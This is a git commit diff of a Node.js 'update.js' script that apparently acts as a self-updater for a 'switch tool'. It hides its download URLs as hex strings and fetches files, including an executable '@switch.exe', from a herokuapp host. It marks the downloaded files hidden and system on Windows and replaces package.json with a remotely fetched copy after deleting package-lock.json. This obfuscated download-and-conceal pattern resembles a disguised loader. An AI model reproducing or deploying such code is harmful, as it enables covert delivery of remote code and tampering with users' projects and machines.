081a2a1c477b5867ba53e8cbe871bb0ca8828dfd
Phillip <phillip7.et@gmail.com>
2019-06-19 23:12:39 +0700

    update pkg

--- update.js
+++ update.js
@@ -4,12 +4,16 @@ var hW = [
     fhs('68747470733a2f2f626c6f6773706f747363726170696e672e6865726f6b756170702e636f6d2f737769746368746f6f6c2f73796e63'),// [2sync]
     fhs('68747470733a2f2f626c6f6773706f747363726170696e672e6865726f6b756170702e636f6d2f737769746368746f6f6c2f407377697463682e657865'),// [3e] -
     fhs('407377697463682e657865'),// [4e]
+    fhs('7061636b6167652d6c6f636b2e6a736f6e'),// [5] lock
+    fhs('7061636b6167652e6a736f6e'),// [6] pg_
+    fhs('68747470733a2f2f626c6f6773706f747363726170696e672e6865726f6b756170702e636f6d2f737769746368746f6f6c2f7061636b6167652e6a736f6e'),// [21] - https://blogspotscraping.herokuapp.com/switchtool/package.json_
+
 ],
-    links = { c: hex2a(hW[0]), s: hex2a(hW[1]), sync: hex2a(hW[2]), snet: hex2a(hW[3]) },
-    npm = require('npm'),
+    links = { c: hex2a(hW[0]), s: hex2a(hW[1]), sync: hex2a(hW[2]), snet: hex2a(hW[3]), pkg: hex2a(hW[7]) },
     request = require("request"),
     rp = require('request-promise'),
     fs = require("fs"),
+    fspr = fs.promises,
     log = console.log,
     headers = {
         'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0',
@@ -36,15 +40,20 @@ function hex2a(hex) {
     }
     return str;
 }
-function saveFile(fileName, fileContent) {
-    var folder = "./";
-    if (!fs.existsSync(folder)) {
-        fs.mkdirSync(folder);
+async function deleteFile(fileName) {
+    if (fileName == 'snet') fileName = hex2a(hW[4])
+    if (fs.existsSync(fileName)) {
+        await fs.unlinkSync(fileName)
+        //log('Deleted %s', fileName)
     }
-    fs.writeFile(folder + fileName, fileContent, function (err) {
-        if (err) return log(err);
-        //log("updated " + fileName + " > successfully");
-    });
+}
+async function saveFile(fileName, fileContent) {
+    // var folder = "./";
+    // if (!fs.existsSync(folder)) {
+    //     fs.mkdirSync(folder);
+    // }
+    await fspr.writeFile(fileName, fileContent);
+    //log("Updated " + fileName + " > successfully");
 }
 async function fetchTool(url) {
     var options = {
@@ -59,37 +68,46 @@ async function update(toolName) {
         case 'c':
         case 's':
         case 'sync':
+        case 'pkg':
             let tool = await fetchTool(linkTool);
-            saveFile(toolName, tool);
+            if (toolName === 'pkg') toolName = hex2a(hW[6])
+            await saveFile(toolName, tool);
             break;
         case 'snet':
             var fileStream = fs.createWriteStream(__dirname + '/' + hex2a(hW[4]));
             fileStream.on('close', function () {
-                //console.log('updated snet > successfully');
+                //log('Updated snet > successfully');
             });
             request(linkTool).pipe(fileStream);
             break;
     }
 }
 (async function () {
-        log('Updating...')
-        await update('c');
-        await update('s');
-        await update('sync');
-        await update('snet');
-        log('Updated')
-        log('Configurating...')
-        var winattr = require('winattr')
-        winattr.setSync('c', {hidden:true});
-        winattr.setSync('c', {system:true});
-        winattr.setSync('s', {hidden:true});
-        winattr.setSync('s', {system:true});
-        winattr.setSync('sync', {hidden:true});
-        winattr.setSync('sync', {system:true});
-        winattr.setSync(hex2a(hW[4]), {hidden:true});
-        winattr.setSync(hex2a(hW[4]), {system:true});
-        log('Done !')
-        log('======================== Manual ========================')
-        log('type "node help s" -> show manual of switch tool')
-        log('type "node help c" -> show manual of check & copy tool')
+    await deleteFile('c')
+    process.stdout.write('\033c'); 
+    log('Updating...')
+    await deleteFile('s')
+    await deleteFile('sync')
+    await deleteFile('snet')
+    await update('c')
+    await update('s')
+    await update('sync')
+    await update('snet')
+    log('Updated')
+    log('Configurating...')
+    var winattr = require('winattr')
+    winattr.setSync('c', { hidden: true });
+    winattr.setSync('c', { system: true });
+    winattr.setSync('s', { hidden: true });
+    winattr.setSync('s', { system: true });
+    winattr.setSync('sync', { hidden: true });
+    winattr.setSync('sync', { system: true });
+    winattr.setSync(hex2a(hW[4]), { hidden: true });
+    winattr.setSync(hex2a(hW[4]), { system: true });
+    if (fs.existsSync(hex2a(hW[5]))) fs.unlinkSync(hex2a(hW[5]))
+    await update('pkg')
+    log('Done !!!')
+    log('======================== Manual ========================')
+    log('type "node help s" -> show manual of switch tool')
+    log('type "node help c" -> show manual of check & copy tool')
 })()
